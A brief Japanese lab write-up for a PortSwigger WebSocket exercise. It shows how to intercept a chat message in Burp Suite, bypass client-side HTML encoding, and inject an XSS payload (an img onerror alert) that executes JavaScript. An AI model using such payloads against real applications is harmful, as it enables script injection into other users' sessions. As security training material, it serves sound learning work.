# WebSocket メッセージを操作して脆弱性を悪用する

以下のハッキングラボを実施します  
https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities

- 1. BurpSuite を起動し、Proxy タブからブラウザを起動
- 2. ハッキングラボにアクセスします
- 3. Livechat 機能で<hello と入力します
- 4. websocket hitory で上記内容を確認します

```
{"message":"&lt;hello"}
```

クライアント側で HTML エンコーディングされています

- 5. 上記の送信データを send to repeater します
- 6. 送信データを以下のように書き換えます

```
{"message":"<img src=1 onerror='alert(1)'>"}
```

- 7. 送信すると javascript の実行が確認できます
